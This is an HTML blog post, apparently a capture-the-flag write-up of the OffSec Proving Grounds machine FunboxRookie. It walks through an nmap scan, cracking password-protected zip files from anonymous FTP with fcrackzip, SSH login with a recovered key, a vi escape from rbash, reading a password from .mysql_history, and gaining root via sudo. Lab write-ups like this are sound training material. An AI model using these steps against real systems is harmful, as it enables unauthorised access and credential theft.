@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Play: FunboxRookie</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Play: FunboxRookie | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Play: FunboxRookie" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds play linux machine writeup" />
+<meta property="og:description" content="Offsec proving grounds play linux machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/09/14/Proving_grounds_Play-FunboxRookie.html" />
+<meta property="og:url" content="http://localhost:4000/2023/09/14/Proving_grounds_Play-FunboxRookie.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-09-14T01:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Play: FunboxRookie" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-09-14T01:00:00+05:30","datePublished":"2023-09-14T01:00:00+05:30","description":"Offsec proving grounds play linux machine writeup","headline":"Proving grounds Play: FunboxRookie","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/09/14/Proving_grounds_Play-FunboxRookie.html"},"url":"http://localhost:4000/2023/09/14/Proving_grounds_Play-FunboxRookie.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/09/14/Proving_grounds_Play-FunboxRookie.html">
+    <h2 class="post-title">Proving grounds Play: FunboxRookie</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Sep 14, 2023</div></div>
+  <div class="post">
+    <h2 id="nmap">Nmap</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD 1.3.5e
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+| <span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 anna.zip
+| <span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
+| <span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 bud.zip
+| <span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
+| <span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 homer.zip
+| <span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
+| <span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 john.zip
+| <span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 marge.zip
+| <span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
+| <span class="nt">-r--r--r--</span>   1 ftp      ftp          1477 Jul 25  2020 tom.zip
+| <span class="nt">-rw-r--r--</span>   1 ftp      ftp           170 Jan 10  2018 welcome.msg
+|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 f9467dfe0c4da97e2d77740fa2517251 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 15004667809b40123a0c6607db1d1847 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 75ba6695bb0f16de7e7ea17b273bb058 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-robots.txt: 1 disallowed entry 
+|_/logs/
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="web-port-80">Web PORT: 80</h2>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/FunboxRookie/web.png" alt="img" /></p>
+
+<h2 id="ftp-port-21">FTP PORT: 21</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lftp&gt; <span class="nb">ls
+</span>229 Entering Extended Passive Mode <span class="o">(||</span>|63774|<span class="o">)</span>
+150 Opening ASCII mode data connection <span class="k">for </span>file list
+<span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 anna.zip
+<span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
+<span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 bud.zip
+<span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
+<span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 homer.zip
+<span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
+<span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 john.zip
+<span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 marge.zip
+<span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
+<span class="nt">-r--r--r--</span>   1 ftp      ftp          1477 Jul 25  2020 tom.zip
+<span class="nt">-rw-r--r--</span>   1 ftp      ftp           170 Jan 10  2018 welcome.msg
+<span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
+226 Transfer <span class="nb">complete</span>
+</code></pre></div></div>
+
+<p>Download all files and extract the files, which are password protected.</p>
+
+<h3 id="cracking-password">Cracking password</h3>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fcrackzip <span class="nt">-u</span> <span class="nt">-D</span> <span class="nt">-p</span> /usr/share/wordlists/rockyou.txt file.zip
+</code></pre></div></div>
+
+<p>Use the above tool to crack the password, an alternative way to crack the password is to use <code class="language-plaintext highlighter-rouge">zip2john</code> tool to create hash for the zip files and then later use john to crack the hashes.</p>
+
+<p>After trying to crack passwords for all the files, the process resulted in failure except for files <code class="language-plaintext highlighter-rouge">tom.zip</code> and <code class="language-plaintext highlighter-rouge">catherine.zip</code>.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/FunboxRookie/crack.png" alt="img" /></p>
+
+<p>Extract the zip files using the passwords and use the <code class="language-plaintext highlighter-rouge">id_rsa</code> key to login to the remote machine using SSH.</p>
+
+<p>The user <code class="language-plaintext highlighter-rouge">tom</code> has restricted shell <code class="language-plaintext highlighter-rouge">rbash</code>. Use the below technique to bypass the restriction.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vi
+:set <span class="nv">shell</span><span class="o">=</span>/bin/bash
+:shell
+</code></pre></div></div>
+
+<p>The user has a <code class="language-plaintext highlighter-rouge">.mysql_history</code> file in the machine, which we can check for passwords.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@funbox2:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span>
+total 48
+drwxr-xr-x 5 tom  tom  4096 Sep 14 01:51 <span class="nb">.</span>
+drwxr-xr-x 3 root root 4096 Jul 25  2020 ..
+<span class="nt">-rw-------</span> 1 tom  tom    53 Sep 14 01:49 .bash_history
+<span class="nt">-rw-r--r--</span> 1 tom  tom   220 Apr  4  2018 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 tom  tom  3771 Apr  4  2018 .bashrc
+drwx------ 2 tom  tom  4096 Sep 14 01:48 .cache
+drwx------ 3 tom  tom  4096 Jul 25  2020 .gnupg
+<span class="nt">-rw-------</span> 1 tom  tom  1675 Jul 25  2020 id_rsa
+<span class="nt">-rw-r--r--</span> 1 tom  tom    33 Sep 14 01:31 local.txt
+<span class="nt">-rw-------</span> 1 tom  tom   295 Jul 25  2020 .mysql_history
+<span class="nt">-rw-r--r--</span> 1 tom  tom   807 Apr  4  2018 .profile
+drwx------ 2 tom  tom  4096 Sep 14 01:52 .ssh
+</code></pre></div></div>
+
+<p>The file has the password for user tom.</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>insert\040into\040support\040(tom,\040█████████);
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>After checking the permissions for the user tom he has ALL the permissions in the machine which allows us to get root shell using <code class="language-plaintext highlighter-rouge">sudo su</code> and user tom password.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User tom may run the following commands on funbox2:
+    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+</code></pre></div></div>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/FunboxRookie/root.png" alt="img" /></p>
+
+<p><strong>Root obtained</strong></p>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
